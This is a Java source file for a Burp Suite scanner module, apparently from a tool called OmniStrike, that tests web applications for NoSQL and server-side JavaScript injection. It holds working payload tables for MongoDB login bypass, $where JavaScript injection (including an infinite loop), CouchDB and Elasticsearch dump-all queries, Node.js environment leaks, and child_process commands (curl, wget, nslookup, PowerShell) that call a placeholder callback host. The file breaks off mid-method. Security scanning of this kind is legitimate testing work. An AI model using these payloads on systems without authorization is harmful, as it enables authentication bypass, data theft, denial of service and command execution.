package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;

import com.omnistrike.model.*;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MODULE: NoSQL Injection Scanner
 * Comprehensive NoSQL injection detection covering authentication bypass,
 * error-based detection, boolean-based blind, time-based blind, and
 * JavaScript injection ($where) across MongoDB, CouchDB, and Elasticsearch.
 *
 * Detection phases:
 *   Phase 1 - Authentication Bypass (operator injection)
 *   Phase 2 - Error-based Detection
 *   Phase 3 - Boolean-based Blind
 *   Phase 4 - Time-based Blind ($where sleep)
 *   Phase 5 - JavaScript Injection ($where evaluation)
 *   Phase 8 - Server-Side JavaScript Injection (SSJI) — Node.js eval/Function/vm
 *
 * Multi-database coverage: MongoDB (primary), CouchDB, Elasticsearch.
 * All findings reported via FindingsStore with requestResponse attached.
 */
public class NoSqlInjectionScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    // Deduplication: tested parameters tracked by urlPath + paramName
    private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();

    // ==================== ERROR PATTERNS ====================

    // NoSQL database error patterns for error-based detection
    private static final Map<String, List<Pattern>> NOSQL_ERROR_PATTERNS = new LinkedHashMap<>();

    static {
        NOSQL_ERROR_PATTERNS.put("MongoDB", List.of(
                Pattern.compile("MongoError", Pattern.CASE_INSENSITIVE),
                Pattern.compile("MongoServerError", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Mongo\\.Error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("BSON", Pattern.CASE_INSENSITIVE),
                Pattern.compile("\\$where", Pattern.CASE_INSENSITIVE),
                Pattern.compile("MongoDB", Pattern.CASE_INSENSITIVE),
                Pattern.compile("BSONTypeError", Pattern.CASE_INSENSITIVE),
                Pattern.compile("CastError", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SyntaxError.*?Unexpected token", Pattern.CASE_INSENSITIVE),
                Pattern.compile("MongoParseError", Pattern.CASE_INSENSITIVE),
                Pattern.compile("\\$operator", Pattern.CASE_INSENSITIVE),
                Pattern.compile("unknown operator", Pattern.CASE_INSENSITIVE),
                Pattern.compile("bad query", Pattern.CASE_INSENSITIVE),
                Pattern.compile("cannot apply \\$", Pattern.CASE_INSENSITIVE),
                Pattern.compile("\\$err", Pattern.CASE_INSENSITIVE),
                Pattern.compile("errmsg.*?operator", Pattern.CASE_INSENSITIVE),
                Pattern.compile("writeErrors", Pattern.CASE_INSENSITIVE),
                Pattern.compile("cursor not found", Pattern.CASE_INSENSITIVE),
                Pattern.compile("\\$all.*must be array", Pattern.CASE_INSENSITIVE),
                Pattern.compile("\\$in.*must be array", Pattern.CASE_INSENSITIVE),
                Pattern.compile("FailedToParse", Pattern.CASE_INSENSITIVE)
        ));
        NOSQL_ERROR_PATTERNS.put("CouchDB", List.of(
                Pattern.compile("CouchDB", Pattern.CASE_INSENSITIVE),
                Pattern.compile("couchdb", Pattern.CASE_INSENSITIVE),
                Pattern.compile("invalid_json", Pattern.CASE_INSENSITIVE),
                Pattern.compile("bad_request.*?json", Pattern.CASE_INSENSITIVE),
                Pattern.compile("DocumentDB", Pattern.CASE_INSENSITIVE),
                Pattern.compile("no_db_file", Pattern.CASE_INSENSITIVE),
                Pattern.compile("design_doc_not_found", Pattern.CASE_INSENSITIVE),
                Pattern.compile("compilation_error", Pattern.CASE_INSENSITIVE)
        ));
        NOSQL_ERROR_PATTERNS.put("Couchbase", List.of(
                Pattern.compile("Couchbase", Pattern.CASE_INSENSITIVE),
                Pattern.compile("N1QL", Pattern.CASE_INSENSITIVE),
                Pattern.compile("couchbase\\.error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("syntax error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("parse.*error", Pattern.CASE_INSENSITIVE)
        ));
        NOSQL_ERROR_PATTERNS.put("Elasticsearch", List.of(
                Pattern.compile("query_parsing_exception", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SearchParseException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("ElasticsearchException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("parsing_exception", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Elasticsearch", Pattern.CASE_INSENSITIVE),
                Pattern.compile("search_phase_execution_exception", Pattern.CASE_INSENSITIVE),
                Pattern.compile("json_parse_exception", Pattern.CASE_INSENSITIVE),
                Pattern.compile("index_not_found_exception", Pattern.CASE_INSENSITIVE),
                Pattern.compile("illegal_argument_exception", Pattern.CASE_INSENSITIVE),
                Pattern.compile("script_exception", Pattern.CASE_INSENSITIVE)
        ));
        NOSQL_ERROR_PATTERNS.put("Generic NoSQL", List.of(
                Pattern.compile("SyntaxError:", Pattern.CASE_INSENSITIVE),
                Pattern.compile("ReferenceError:", Pattern.CASE_INSENSITIVE),
                Pattern.compile("TypeError.*?undefined is not", Pattern.CASE_INSENSITIVE),
                Pattern.compile("\\$where not allowed", Pattern.CASE_INSENSITIVE),
                Pattern.compile("EvalError", Pattern.CASE_INSENSITIVE),
                Pattern.compile("RangeError", Pattern.CASE_INSENSITIVE),
                Pattern.compile("URIError", Pattern.CASE_INSENSITIVE)
        ));
        NOSQL_ERROR_PATTERNS.put("Redis", List.of(
                Pattern.compile("ERR unknown command", Pattern.CASE_INSENSITIVE),
                Pattern.compile("WRONGTYPE", Pattern.CASE_INSENSITIVE),
                Pattern.compile("RedisError", Pattern.CASE_INSENSITIVE)
        ));
        NOSQL_ERROR_PATTERNS.put("DynamoDB", List.of(
                Pattern.compile("ValidationException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("ConditionalCheckFailedException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("ProvisionedThroughputExceededException", Pattern.CASE_INSENSITIVE)
        ));
    }

    // ==================== AUTH BYPASS PAYLOADS (QUERY/BODY PARAMS) ====================

    // Operator injection payloads for URL query and form-encoded body parameters
    // These exploit MongoDB's query syntax when parameters are parsed as objects
    private static final String[][] AUTH_BYPASS_PARAM_PAYLOADS = {
            // payload_suffix appended after param name, description
            // These are sent as parameter name variations: param[$ne]=value
            {"[$ne]", "", "MongoDB $ne operator (not equal empty)"},
            {"[$gt]", "", "MongoDB $gt operator (greater than empty)"},
            {"[$regex]", ".*", "MongoDB $regex operator (match anything)"},
            {"[$exists]", "true", "MongoDB $exists operator"},
            {"[$nin][]", "", "MongoDB $nin operator (not in empty array)"},
            {"[$gte]", "", "MongoDB $gte operator (greater than or equal empty)"},
            {"[$lt]", "~", "MongoDB $lt operator (less than tilde - high ASCII)"},
            {"[$lte]", "~", "MongoDB $lte operator (less than or equal tilde)"},
            {"[$in][]", "", "MongoDB $in operator (in empty array - should return nothing as control)"},
            {"[$regex]", "^", "MongoDB $regex operator (match beginning)"},
            {"[$not][$regex]", "^$", "MongoDB $not $regex (not empty - matches all non-empty values)"},
            {"[$type]", "2", "MongoDB $type operator (type 2 = string, matches if field is string)"},
            {"[$comment]", "omnistrike_test", "MongoDB $comment operator (no-op injection probe)"},
            {"[$size]", "0", "MongoDB $size operator (array size zero)"},
            {"[$all][]", "", "MongoDB $all operator (all match empty array)"},
            {"[$elemMatch][$gt]", "", "MongoDB $elemMatch with $gt"},
            {"[$not][$eq]", "", "MongoDB $not $eq (not equal empty - matches non-empty)"},
            {"[$regex]", "^[a-zA-Z]", "MongoDB $regex starts with letter"},
            {"[$where]", "1", "MongoDB $where truthy (JS eval to true)"},
            {"[$options]", "i", "MongoDB $options case insensitive (modifier injection)"},
            {"[$regex]", "[\\s\\S]*", "MongoDB $regex match any including newlines"},
            {"[$ne]", "null", "MongoDB $ne null (not equal null - matches all non-null)"},
            {"[$gt]", "undefined", "MongoDB $gt undefined"},
    };

    // ==================== AUTH BYPASS PAYLOADS (JSON BODY) ====================

    // For JSON bodies, we inject MongoDB operator objects instead of string values
    // e.g., {"username": {"$ne": ""}, "password": {"$ne": ""}}
    private static final String[][] AUTH_BYPASS_JSON_OPERATORS = {
            // operator, value, description
            {"$ne", "\"\"", "MongoDB $ne operator (not equal empty string)"},
            {"$gt", "\"\"", "MongoDB $gt operator (greater than empty string)"},
            {"$regex", "\".*\"", "MongoDB $regex operator (match anything)"},
            {"$exists", "true", "MongoDB $exists operator"},
            {"$nin", "[\"\"]", "MongoDB $nin operator (not in empty string array)"},
            {"$gte", "\"\"", "MongoDB $gte operator (greater than or equal empty)"},
            {"$not", "{\"$eq\": \"\"}", "MongoDB $not $eq (matches all non-empty values)"},
            {"$type", "2", "MongoDB $type operator (type 2 = string, matches string fields)"},
            {"$nin", "[]", "MongoDB $nin empty array (matches everything)"},
            {"$regex", "\"[\\\\s\\\\S]*\"", "MongoDB $regex match everything including newlines"},
            {"$ne", "null", "MongoDB $ne null (not equal null)"},
            {"$gt", "0", "MongoDB $gt zero (numeric greater than 0)"},
            {"$lt", "{\"$date\": \"9999-12-31T23:59:59.999Z\"}", "MongoDB $lt far future date"},
            {"$where", "\"1\"", "MongoDB $where truthy"},
            {"$elemMatch", "{\"$gt\": \"\"}", "MongoDB $elemMatch with nested $gt"},
            {"$all", "[\"\"]", "MongoDB $all containing empty string"},
    };

    // $or-based auth bypass payloads for JSON bodies (injected at document root level)
    // These replace the entire body to inject $or conditions
    private static final String[][] AUTH_BYPASS_JSON_OR_PAYLOADS = {
            // payload_template (FIELD_PLACEHOLDER replaced with target field name), description
            {"{\"$or\": [{\"FIELD_PLACEHOLDER\": {\"$ne\": \"\"}}, {\"FIELD_PLACEHOLDER\": {\"$exists\": true}}]}", "MongoDB $or with $ne/$exists bypass"},
            {"{\"$or\": [{\"FIELD_PLACEHOLDER\": {\"$gt\": \"\"}}, {\"FIELD_PLACEHOLDER\": {\"$regex\": \".*\"}}]}", "MongoDB $or with $gt/$regex bypass"},
            {"{\"FIELD_PLACEHOLDER\": {\"$ne\": 1}, \"$or\": [{}, {\"FIELD_PLACEHOLDER\": {\"$exists\": true}}]}", "MongoDB $or appended with $ne"},
            {"{\"$or\": [{\"FIELD_PLACEHOLDER\": {\"$regex\": \".*\"}}, {\"FIELD_PLACEHOLDER\": {\"$ne\": null}}]}", "MongoDB $or with $regex/$ne null"},
            {"{\"$and\": [{\"$or\": [{\"FIELD_PLACEHOLDER\": {\"$ne\": \"\"}}]}, {\"$or\": [{\"FIELD_PLACEHOLDER\": {\"$exists\": true}}]}]}", "MongoDB $and with nested $or"},
            {"{\"FIELD_PLACEHOLDER\": {\"$nin\": []}, \"$comment\": \"omnistrike\"}", "MongoDB $nin empty array with $comment"},
            {"{\"$or\": [{\"FIELD_PLACEHOLDER\": 1}, {\"FIELD_PLACEHOLDER\": {\"$ne\": 1}}]}", "MongoDB $or tautology (1 or not 1)"},
    };

    // ==================== ERROR-BASED PAYLOADS ====================

    private static final String[] ERROR_PAYLOADS = {
            "'",
            "\"",
            "\\",
            "{$gt:}",
            "[$where]=1",
            "';return true;var a='",
            "\";return true;var a=\"",
            "' || '1'=='1",
            "{\"$gt\": \"\"}",
            "[$ne]=1",
            "{{\"$gt\":\"\"}}",
            "';var a='a",
            "{\"$where\":\"1\"}",
            "\\x00",
            "null",
            // URL-encoded JSON injection (raw operator as param value)
            "{\"$ne\": \"\"}",
            "{\"$gt\": 0}",
            "{\"$or\": [{}]}",
            "{\"$regex\": \".*\"}",
            // $expr operator probes (MongoDB 3.6+)
            "{\"$expr\": {\"$eq\": [1, 1]}}",
            // $jsonSchema probe (MongoDB 3.6+)
            "{\"$jsonSchema\": {\"required\": [\"_id\"]}}",
            // Aggregation pipeline injection
            "[{\"$match\": {}}]",
            // $lookup injection (MongoDB 3.2+)
            "{\"$lookup\": {\"from\": \"users\", \"localField\": \"_id\", \"foreignField\": \"_id\", \"as\": \"data\"}}",
            // $function injection (MongoDB 4.4+)
            "{\"$function\": {\"body\": \"function(){return true}\", \"args\": [], \"lang\": \"js\"}}",
            // Additional error-triggering payloads
            "[$gt]",
            "[$ne]",
            "{\"\": 1}",
            "[$where]=1;var a=1//",
            "{\"$and\": null}",
            "db.getCollectionNames()",
            "function(){}",
            "this.constructor.constructor('return this')()",
            "[{\"$group\": {\"_id\": null}}]",
            "[{\"$unwind\": \"$_id\"}]",
            "{\"$accumulator\": {}}",
            "{\"$merge\": {\"into\": \"test\"}}",
            "\\u0000",
            "BSON(\"invalid\")",
    };

    // ==================== BOOLEAN BLIND PAYLOADS ====================

    // Pairs of [true_payload_suffix, true_payload_value, false_payload_suffix, false_payload_value]
    // For query/body parameters using operator injection
    private static final String[][] BOOLEAN_PARAM_PAIRS = {
            {"[$regex]", "^a", "[$regex]", "^ZZZZNOTEXISTVALUE99999"},
            {"[$regex]", "^.", "[$regex]", "^ZZZZNOTEXISTVALUE99999"},
            {"[$regex]", ".*", "[$regex]", "^ZZZZNOTEXISTVALUE99999"},
            {"[$ne]", "", "[$eq]", "ZZZZNOTEXISTVALUE99999"},
            {"[$gt]", "", "[$gt]", "~~~~~"},
            {"[$not][$regex]", "^$", "[$regex]", "^ZZZZNOTEXISTVALUE99999"},
            {"[$regex]", "^[a-z]", "[$regex]", "^[^\\\\x00-\\\\x7F]"},
            {"[$ne]", "", "[$eq]", "", "ne vs eq with same value"},
            {"[$gt]", "a", "[$gt]", "zzzzz", "gt low vs gt high"},
            {"[$gte]", "", "[$lte]", "", "gte vs lte empty"},
            {"[$exists]", "true", "[$exists]", "false", "exists true vs false"},
            {"[$type]", "2", "[$type]", "99", "type string vs type invalid"},
            {"[$in][]", "admin", "[$nin][]", "admin", "in vs nin"},
            {"[$regex]", "^[a-zA-Z0-9]", "[$regex]", "^\\\\x00\\\\x01", "regex alphanum vs control chars"},
    };

    // For JSON bodies - operator object pairs
    private static final String[][] BOOLEAN_JSON_PAIRS = {
            // true_operator, true_value, false_operator, false_value, description
            {"$regex", "\"^a\"", "$regex", "\"^ZZZZNOTEXISTVALUE99999\"", "regex true vs impossible regex"},
            {"$regex", "\"^.\"", "$regex", "\"^ZZZZNOTEXISTVALUE99999\"", "regex dot vs impossible regex"},
            {"$ne", "\"\"", "$eq", "\"ZZZZNOTEXISTVALUE99999\"", "$ne empty vs $eq impossible"},
            {"$gt", "\"\"", "$gt", "\"~~~~~\"", "$gt empty vs $gt high value"},
            {"$not", "{\"$eq\": \"\"}", "$eq", "\"\"", "$not $eq (non-empty) vs $eq empty"},
            {"$regex", "\"^[a-z]\"", "$regex", "\"^[^\\\\x00-\\\\x7F]\"", "regex alphanumeric vs non-ASCII"},
            {"$exists", "true", "$exists", "false", "$exists true vs false"},
            {"$nin", "[]", "$in", "[]", "$nin empty array vs $in empty array"},
            {"$gte", "\"\"", "$lte", "\"\"", "$gte empty vs $lte empty"},
            {"$type", "2", "$type", "99", "$type string vs $type invalid"},
            {"$ne", "null", "$eq", "null", "$ne null vs $eq null"},
            {"$gt", "0", "$lt", "0", "$gt zero vs $lt zero"},
    };

    // ==================== TIME-BASED PAYLOADS ====================

    // MongoDB $where with sleep for time-based blind detection
    private static final String[] TIME_PAYLOADS = {
            "[$where]=sleep(5000)",
            "[$where]=function(){sleep(5000);return true;}",
            "[$where]=(function(){var d=new Date();while(new Date()-d<5000){}return true;})()",
            "[$where]=function(){var d=new Date();while(new Date()-d<5000){}return true;}",
            // Alternative JS string-based sleep via tojson/hex tricks
            "[$where]=function(){var a=0;for(var i=0;i<1e8;i++){a+=i;}return true;}",
            "[$where]=function(){var d=Date.now();while(Date.now()-d<5000){}return true;}",
            "[$where]=function(){var x=0;for(var i=0;i<5e8;i++){x+=i;}return true;}",
            "[$where]=(function(){sleep(5000);return true})()",
            "[$where]=this.constructor.constructor('while(true){}')()",
            "[$where]=function(){var s=new Date();do{var c=new Date();}while(c-s<5000);return true;}",
    };

    // Time-based payloads for JSON bodies
    private static final String[] TIME_JSON_PAYLOADS = {
            "{\"$where\": \"sleep(5000)\"}",
            "{\"$where\": \"function(){sleep(5000);return true;}\"}",
            "{\"$where\": \"(function(){var d=new Date();while(new Date()-d<5000){}return true;})()\"}",
            "{\"$where\": \"function(){var d=Date.now();while(Date.now()-d<5000){}return true;}\"}",
            "{\"$where\": \"function(){var x=0;for(var i=0;i<5e8;i++){x+=i;}return true;}\"}",
            "{\"$where\": \"this.constructor.constructor('var d=Date.now();while(Date.now()-d<5000){}')()\"}",
    };

    // ==================== $WHERE JS INJECTION PAYLOADS ====================

    // $where operator evaluation payloads - true vs false pairs
    private static final String[][] WHERE_JS_PAIRS = {
            // true_payload, false_payload, description
            {"[$where]=function(){return true;}", "[$where]=function(){return false;}", "$where true vs false function"},
            {"[$where]=1", "[$where]=0", "$where 1 vs 0"},
            {"[$where]=this.constructor", "[$where]=function(){return false;}", "$where this.constructor vs false"},
            {"[$where]=this.password||true", "[$where]=this.nonexistent_field_xyz&&false", "$where this.password property access"},
            {"[$where]=function(){return Object.keys(this).length>0;}", "[$where]=function(){return Object.keys(this).length>999;}", "$where Object.keys enumeration"},
            {"[$where]=function(){return this._id!=null;}", "[$where]=function(){return this._id==null&&false;}", "$where _id null check"},
            {"[$where]=function(){return typeof this.password!=='undefined';}", "[$where]=function(){return typeof this.nonexistent_xyz!=='undefined';}", "$where typeof property check"},
            {"[$where]=function(){return JSON.stringify(this).length>2;}", "[$where]=function(){return JSON.stringify(this).length>99999;}", "$where JSON.stringify length check"},
            {"[$where]=function(){var k=Object.keys(this);return k.indexOf('password')>=0;}", "[$where]=function(){var k=Object.keys(this);return k.indexOf('nonexistent_xyz99')>=0;}", "$where Object.keys indexOf check"},
            {"[$where]=this.a||true", "[$where]=this.a&&false", "$where short-circuit evaluation"},
    };

    // $where JSON pairs
    private static final String[][] WHERE_JSON_PAIRS = {
            // true_value, false_value, description
            {"\"function(){return true;}\"", "\"function(){return false;}\"", "$where true vs false function"},
            {"\"1\"", "\"0\"", "$where 1 vs 0"},
            {"\"this.password||true\"", "\"this.nonexistent_field_xyz&&false\"", "$where this.password property access"},
            {"\"function(){return Object.keys(this).length>0;}\"", "\"function(){return Object.keys(this).length>999;}\"", "$where Object.keys enumeration"},
            {"\"function(){return typeof this.password!=='undefined';}\"", "\"function(){return typeof this.nonexistent_xyz!=='undefined';}\"", "$where typeof property"},
            {"\"function(){return JSON.stringify(this).length>2;}\"", "\"function(){return JSON.stringify(this).length>99999;}\"", "$where JSON.stringify length"},
            {"\"this.a||true\"", "\"this.a&&false\"", "$where short-circuit"},
    };

    // ==================== MULTI-DB PAYLOADS ====================

    // CouchDB Mango query injection payloads (for JSON bodies)
    private static final String[] COUCHDB_JSON_PAYLOADS = {
            "{\"selector\": {\"$gt\": null}}",
            "{\"selector\": {\"_id\": {\"$gt\": null}}}",
            "{\"selector\": {\"_id\": {\"$regex\": \".*\"}}}",
            "{\"selector\": {\"$or\": [{\"_id\": {\"$gt\": null}}]}}",
            "{\"selector\": {\"_id\": {\"$exists\": true}}}",
            "{\"selector\": {\"_id\": {\"$gte\": null}}, \"limit\": 25}",
            "{\"selector\": {\"_id\": {\"$type\": \"string\"}}, \"limit\": 100}",
            "{\"selector\": {\"$and\": [{\"_id\": {\"$gt\": null}}, {\"_id\": {\"$lt\": \"\\ufff0\"}}]}}",
            "{\"selector\": {}, \"fields\": [\"_id\", \"_rev\"]}",
            "{\"selector\": {\"_id\": {\"$ne\": null}}, \"sort\": [{\"_id\": \"asc\"}]}",
            "{\"selector\": {\"type\": {\"$regex\": \".*\"}}, \"limit\": 1000}",
    };

    // Elasticsearch query injection payloads (for JSON bodies)
    private static final String[] ELASTICSEARCH_JSON_PAYLOADS = {
            "{\"query\": {\"match_all\": {}}}",
            "{\"query\": {\"bool\": {\"must\": [{\"match_all\": {}}]}}}",
            "{\"size\": 10000, \"query\": {\"match_all\": {}}}",
            "{\"query\": {\"wildcard\": {\"_all\": \"*\"}}}",
            "{\"query\": {\"script\": {\"script\": \"true\"}}}",
            "{\"aggs\": {\"all\": {\"terms\": {\"field\": \"_id\", \"size\": 10000}}}}",
            "{\"query\": {\"bool\": {\"should\": [{\"match_all\": {}}]}}}",
            "{\"query\": {\"exists\": {\"field\": \"_id\"}}}",
            "{\"query\": {\"range\": {\"_id\": {\"gte\": \"\"}}}, \"size\": 100}",
            "{\"query\": {\"prefix\": {\"_all\": {\"value\": \"\"}}}, \"size\": 1000}",
            "{\"query\": {\"query_string\": {\"query\": \"*\"}}, \"size\": 10000}",
            "{\"query\": {\"fuzzy\": {\"_all\": {\"value\": \"a\", \"fuzziness\": \"AUTO\"}}}}",
            "{\"query\": {\"script\": {\"script\": {\"source\": \"true\", \"lang\": \"painless\"}}}}",
            "{\"_source\": true, \"query\": {\"match_all\": {}}, \"sort\": [{\"_id\": \"asc\"}], \"size\": 5000}",
    };

    // ==================== SSJI (Server-Side JavaScript Injection) PAYLOADS ====================

    // Expression evaluation probes — inject arithmetic, check if result appears in response
    private static final String[][] SSJI_EXPRESSION_PROBES = {
            // payload, expected_result, description
            {"1+1", "2", "arithmetic addition"},
            {"7*7", "49", "arithmetic multiplication"},
            {"3*3*3", "27", "arithmetic chained multiplication"},
            {"'ss'+'ji'", "ssji", "string concatenation"},
            {"100-1", "99", "arithmetic subtraction"},
            {"'omni'+'strike'", "omnistrike", "string concatenation variant"},
            {"Math.sqrt(144)", "12", "Math.sqrt function"},
            {"[1,2,3].length", "3", "array length"},
            {"String.fromCharCode(79,75)", "OK", "fromCharCode"},
            {"typeof process", "object", "typeof process"},
            {"Buffer.from('dGVzdA==','base64').toString()", "test", "Buffer base64 decode"},
    };

    // Node.js-specific output detection payloads
    private static final String[][] SSJI_OUTPUT_PROBES = {
            // payload, response_pattern, description
            {"process.version", "v\\d+\\.\\d+", "Node.js process.version leak"},
            {"process.platform", "linux|win32|darwin|freebsd", "Node.js process.platform leak"},
            {"process.arch", "x64|arm64|ia32|arm", "Node.js process.arch leak"},
            {"require('os').type()", "Linux|Windows_NT|Darwin", "Node.js OS type leak"},
            {"require('os').hostname()", ".", "Node.js hostname leak"},
            {"process.env.PATH||process.env.Path", "/usr|C:\\\\", "Node.js PATH env variable leak"},
            {"process.cwd()", "/", "Node.js current working directory"},
            {"require('os').release()", "\\d+\\.\\d+", "Node.js OS release"},
            {"require('os').cpus().length", "\\d+", "Node.js CPU count"},
            {"require('os').totalmem()", "\\d{8,}", "Node.js total memory"},
            {"require('os').networkInterfaces()", "address", "Node.js network interfaces"},
            {"process.pid", "\\d+", "Node.js process ID"},
            {"global.constructor.name", "Object", "Node.js global object type"},
    };

    // Time-based SSJI payloads — cause server-side delay
    private static final String[] SSJI_TIME_PAYLOADS_UNIX = {
            "require('child_process').execSync('sleep 5')",
            "(function(){var d=Date.now();while(Date.now()-d<5000){}return 1})()",
            "require('child_process').execSync('sleep 5').toString()",
            "(function(){var a=Date.now();while(Date.now()-a<5000){};return 'x'})()",
            "require('child_process').spawnSync('sleep',['5'])",
    };

    private static final String[] SSJI_TIME_PAYLOADS_WINDOWS = {
            "require('child_process').execSync('ping -n 6 127.0.0.1')",
            "(function(){var d=Date.now();while(Date.now()-d<5000){}return 1})()",
            "require('child_process').execSync('timeout /t 5 /nobreak').toString()",
            "require('child_process').execSync('waitfor /t 5 OmniStrikeDelay 2>nul').toString()",
            "require('child_process').spawnSync('ping',['-n','6','127.0.0.1'])",
    };

    // OOB SSJI payloads (Collaborator-based) — direct JS execution without $where wrapper
    private static final String[][] SSJI_OOB_PAYLOADS = {
            // payload_template (COLLAB_PLACEHOLDER will be replaced), technique
            {"require('child_process').exec('nslookup COLLAB_PLACEHOLDER')", "child_process exec nslookup"},
            {"require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')", "child_process execSync nslookup"},
            {"require('dns').resolve('COLLAB_PLACEHOLDER',function(){})", "dns.resolve callback"},
            {"require('http').get('http://COLLAB_PLACEHOLDER/')", "http.get callback"},
            {"require('https').get('https://COLLAB_PLACEHOLDER/')", "https.get callback"},
            {"(new(require('net').Socket)).connect(80,'COLLAB_PLACEHOLDER')", "net.Socket connect"},
            {"fetch('http://COLLAB_PLACEHOLDER/ssji')", "fetch API callback"},
            {"require('child_process').exec('curl http://COLLAB_PLACEHOLDER/ssji')", "child_process exec curl"},
            {"require('child_process').exec('wget http://COLLAB_PLACEHOLDER/ssji')", "child_process exec wget"},
            {"require('child_process').execSync('ping -c 1 COLLAB_PLACEHOLDER')", "child_process execSync ping"},
            {"(new (require('http').ClientRequest)({hostname:'COLLAB_PLACEHOLDER',port:80,path:'/ssji'})).end()", "http.ClientRequest"},
            {"require('child_process').exec('powershell -c Invoke-WebRequest http://COLLAB_PLACEHOLDER/ps')", "child_process powershell IWR"},
            {"process.mainModule.require('child_process').exec('nslookup COLLAB_PLACEHOLDER')", "process.mainModule nslookup"},
            {"this.constructor.constructor('return process')().mainModule.require('child_process').exec('nslookup COLLAB_PLACEHOLDER')", "constructor chain nslookup"},
            {"import('child_process').then(m=>m.exec('nslookup COLLAB_PLACEHOLDER'))", "dynamic import nslookup"},
    };

    // ==================== MODULE INTERFACE ====================

    @Override
    public String getId() { return "nosqli-scanner"; }

    @Override
    public String getName() { return "NoSQL Injection Scanner"; }

    @Override
    public String getDescription() {
        return "Comprehensive NoSQL injection detection: auth bypass, error-based, boolean-blind, "
                + "time-blind, $where JS injection, SSJI (eval/Function/vm), and OOB across MongoDB, CouchDB, and Elasticsearch.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    /**
     * Inject external dependencies from the framework.
     */
    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<NoSqlTarget> targets = extractTargets(request);

        for (NoSqlTarget target : targets) {
            if (!dedup.markIfNew("nosqli-scanner", urlPath, target.name)) continue;

            try {
                testNoSqlInjection(requestResponse, target, urlPath);
            } catch (Exception e) {
                api.logging().logToError("NoSQLi test error on " + target.name + ": " + e.getMessage());
            }
        }

        return Collections.emptyList(); // Findings are added async to FindingsStore
    }

    // ==================== MAIN TEST ORCHESTRATOR ====================

    private void testNoSqlInjection(HttpRequestResponse original, NoSqlTarget target, String urlPath) {
        try {
            // Phase 0: Establish baseline
            HttpRequestResponse baseline = sendWithPayload(original, target, target.originalValue);
            if (baseline == null || baseline.response() == null) return;

            int baselineStatus = baseline.response().statusCode();
            String baselineBody = baseline.response().bodyToString();
            int baselineLength = baselineBody.length();

            // Phase 1: Authentication Bypass (Boolean-based operator injection)
            if (config.getBool("nosqli.authBypass.enabled", true)) {
                testAuthBypass(original, target, baselineStatus, baselineBody, baselineLength);
            }

            // Phase 2: Error-based Detection
            if (config.getBool("nosqli.error.enabled", true)) {
                testErrorBased(original, target, baselineBody);
            }

            // Phase 3: Boolean-based Blind
            if (config.getBool("nosqli.boolean.enabled", true)) {
                testBooleanBlind(original, target, baselineStatus, baselineBody, baselineLength);
            }

            // Phase 4: Time-based Blind ($where sleep) — multi-baseline
            if (config.getBool("nosqli.time.enabled", true)) {
                TimedResult baselineTimed = measureResponseTime(original, target, target.originalValue);
                TimedResult bt2 = measureResponseTime(original, target, target.originalValue);
                TimedResult bt3 = measureResponseTime(original, target, target.originalValue);
                long nosqlBaselineTime = Math.max(baselineTimed.elapsedMs, Math.max(
                        bt2.response != null ? bt2.elapsedMs : 0,
                        bt3.response != null ? bt3.elapsedMs : 0));
                testTimeBased(original, target, nosqlBaselineTime);
            }

            // Phase 5: JavaScript Injection ($where evaluation)
            if (config.getBool("nosqli.where.enabled", true)) {
                testWhereJsInjection(original, target, baselineStatus, baselineBody, baselineLength);
            }

            // Phase 6: OOB/Collaborator-based NoSQL injection via $where JS execution
            if (config.getBool("nosqli.oob.enabled", true)
                    && collaboratorManager != null && collaboratorManager.isAvailable()) {
                testOobNoSql(original, target, original.request().url());
            }

            // Phase 7: Multi-database coverage (CouchDB, Elasticsearch) for JSON bodies
            if (target.type == TargetType.JSON) {
                testMultiDbInjection(original, target, baselineStatus, baselineBody, baselineLength);
            }

            // Phase 8: Server-Side JavaScript Injection (SSJI) — Node.js eval/Function/vm
            if (config.getBool("nosqli.ssji.enabled", true)) {
                testSsji(original, target, baselineBody, baselineLength);
            }

        } catch (Exception e) {
            api.logging().logToError("NoSQLi test error for " + target.name + ": " + e.getMessage());
        }
    }

    // ==================== PHASE 1: AUTH BYPASS ====================

    /**
     * Tests for MongoDB operator injection that can bypass authentication.
     * For query/body params: injects operator suffixes like param[$ne]=
     * For JSON bodies: replaces string values with operator objects like {"$ne": ""}
     */
    private void testAuthBypass(HttpRequestResponse original, NoSqlTarget target,
                                 int baselineStatus, String baselineBody, int baselineLength) {
        String url = original.request().url();

        if (target.type == TargetType.JSON) {
            // JSON body: inject operator objects
            testAuthBypassJson(original, target, url, baselineStatus, baselineBody, baselineLength);
            // JSON body: inject $or-based bypasses at document root level
            testAuthBypassJsonOr(original, target, url, baselineStatus, baselineBody, baselineLength);
        } else {
